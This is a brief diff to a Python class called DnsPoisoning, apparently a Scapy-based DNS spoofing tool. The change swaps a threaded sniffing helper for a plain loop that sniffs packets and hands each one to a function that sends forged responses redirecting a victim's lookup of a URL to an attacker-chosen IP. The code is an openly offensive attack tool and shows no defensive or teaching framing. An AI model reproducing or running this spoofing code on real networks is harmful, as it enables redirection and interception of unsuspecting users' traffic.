@@ -30,13 +30,8 @@ class DnsPoisoning:
                         send(poisonPacket, verbose=0, iface=interface)
                         print("Fake packet sent")
 
-        def sniffing():
+        while True:
             sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
                   iface=self.interface)
-
-        while True:
-            doSniffThread = threading.Thread(name="sniffThread", target=sniffing)
-            doSniffThread.daemon = True
-            doSniffThread.start()
 
         # print("You are poisoned")
